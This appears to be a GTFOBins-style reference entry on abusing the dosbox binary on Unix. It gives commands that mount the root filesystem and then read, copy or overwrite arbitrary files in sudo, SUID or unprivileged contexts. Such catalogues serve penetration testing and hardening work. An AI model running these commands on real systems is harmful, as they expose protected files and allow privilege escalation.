---
type: gtfobin
name: dosbox
platform: Unix
functions: [file-read, file-write]
tags: [gtfobin, unix, lotl]
---

# dosbox

## file-read

```bash
dosbox -c 'mount c /' -c 'type c:\path\to\input'
```
_The file content will be displayed in the DOSBox graphical window._
**Contexts:** sudo, suid, unprivileged

```bash
dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
cat /path/to/OUTPUT
```
_The file is copied to a readable location._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
dosbox -c 'mount c /' -c "echo DATA >c:\path\to\output" -c exit
```
_Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write._
**Contexts:** sudo, suid, unprivileged
